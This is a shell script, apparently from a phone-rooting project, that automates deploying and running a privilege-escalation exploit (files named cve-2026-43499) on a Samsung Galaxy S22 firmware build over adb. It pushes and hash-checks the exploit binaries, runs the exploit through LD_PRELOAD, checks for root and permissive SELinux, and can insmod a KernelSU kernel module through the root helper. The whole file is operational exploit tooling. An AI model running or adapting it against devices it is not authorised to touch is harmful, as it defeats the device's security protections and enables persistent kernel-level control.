#!/bin/sh
# deploy.sh — one-shot push + verify + run for IONSTACK-S22 (S901BXXSNGZD7).
#
# Usage (from the repo root):
#   ./support/deploy.sh [--attempts N] [--skip-run] [--ksud KO] [--manager APK]
#
# Steps: adb check -> push 3 exploit files -> chmod -> local-vs-device
# sha256 verify -> run exploit -> root check (id; getenforce).
# Optional: --ksud pushes a KernelSU .ko and insmods it through the root
# helper; --manager installs a Manager APK.
#
# Targeted cleanup only (cve-*, temp_su.sock, .cve43499_*): never wipes
# the whole /data/local/tmp like a blind `rm -rf *` would.

set -u

PROJECT="${PROJECT:-S901BXXSNGZD7}"
BINDIR="build/${PROJECT}/bin"
ATTEMPTS=24
SKIP_RUN=0
KSUD=""
MANAGER=""
REMOTE_DIR="/data/local/tmp"

usage() {
  echo "usage: $0 [--attempts N] [--skip-run] [--ksud KO] [--manager APK]" >&2
  exit 2
}

while [ $# -gt 0 ]; do
  case "$1" in
    --attempts) ATTEMPTS="$2"; shift 2 ;;
    --skip-run) SKIP_RUN=1; shift ;;
    --ksud) KSUD="$2"; shift 2 ;;
    --manager) MANAGER="$2"; shift 2 ;;
    -h|--help) usage ;;
    *) echo "unknown arg: $1" >&2; usage ;;
  esac
done

fail() { echo "deploy: ERROR: $*" >&2; exit 1; }

command -v adb >/dev/null 2>&1 || fail "adb not found on PATH"
[ -d "$BINDIR" ] || fail "missing $BINDIR (run: make PROJECT=$PROJECT preload root-helper)"

for f in cve-2026-43499 cve-2026-43499-root cve-exp32; do
  [ -f "$BINDIR/$f" ] || fail "missing $BINDIR/$f"
done

adb get-state >/dev/null 2>&1 || fail "no device (adb get-state failed)"
echo "deploy: device $(adb get-state 2>/dev/null), project $PROJECT"

echo "deploy: targeted cleanup of previous run files"
adb shell "rm -f $REMOTE_DIR/cve-2026-43499 $REMOTE_DIR/cve-2026-43499-root $REMOTE_DIR/cve-exp32 $REMOTE_DIR/temp_su.sock $REMOTE_DIR/.cve43499_hold $REMOTE_DIR/.cve43499_timing" \
  || fail "remote cleanup failed"

echo "deploy: pushing 3 files"
adb push "$BINDIR/cve-2026-43499" "$REMOTE_DIR/cve-2026-43499" || fail "push preload"
adb push "$BINDIR/cve-2026-43499-root" "$REMOTE_DIR/cve-2026-43499-root" || fail "push root helper"
adb push "$BINDIR/cve-exp32" "$REMOTE_DIR/cve-exp32" || fail "push exp32"

adb shell chmod 755 "$REMOTE_DIR/cve-2026-43499" "$REMOTE_DIR/cve-2026-43499-root" "$REMOTE_DIR/cve-exp32" \
  || fail "remote chmod failed"

echo "deploy: verifying sha256 (local vs device)"
OK=1
for f in cve-2026-43499 cve-2026-43499-root cve-exp32; do
  LOCAL_SUM=$(sha256sum "$BINDIR/$f" | awk '{print $1}')
  REMOTE_SUM=$(adb shell "sha256sum $REMOTE_DIR/$f" 2>/dev/null | awk '{print $1}' | tr -d '\r')
  if [ "$LOCAL_SUM" = "$REMOTE_SUM" ] && [ -n "$REMOTE_SUM" ]; then
    echo "deploy: $f OK ($LOCAL_SUM)"
  else
    echo "deploy: $f MISMATCH local=$LOCAL_SUM remote=$REMOTE_SUM" >&2
    OK=0
  fi
done
[ "$OK" = 1 ] || fail "hash verification failed"

if [ -n "$MANAGER" ]; then
  [ -f "$MANAGER" ] || fail "manager apk not found: $MANAGER"
  echo "deploy: installing manager $MANAGER"
  adb install "$MANAGER" || fail "adb install failed"
fi

if [ "$SKIP_RUN" = 1 ]; then
  echo "deploy: pushed + verified, run skipped (--skip-run)"
  exit 0
fi

echo "deploy: running exploit (attempts=$ATTEMPTS)"
echo "deploy: tip — reboot the phone first, close apps, screen unlocked, stay idle"
adb shell "EXPLOIT_ATTEMPTS=$ATTEMPTS LD_PRELOAD=$REMOTE_DIR/cve-2026-43499 sh" \
  || fail "exploit run failed"

echo "deploy: root check"
if adb shell "$REMOTE_DIR/cve-2026-43499-root -c 'id; getenforce'"; then
  echo "deploy: root check done (want uid=0 + Permissive above)"
else
  fail "root helper check failed"
fi

if [ -n "$KSUD" ]; then
  [ -f "$KSUD" ] || fail "ksud module not found: $KSUD"
  echo "deploy: pushing + loading KernelSU module"
  adb push "$KSUD" "$REMOTE_DIR/kernelsu.ko" || fail "push kernelsu.ko"
  adb shell "$REMOTE_DIR/cve-2026-43499-root -c 'insmod $REMOTE_DIR/kernelsu.ko'" \
    || fail "insmod failed"
  echo "deploy: module loaded — open the Manager app to confirm"
fi

echo "deploy: DONE"
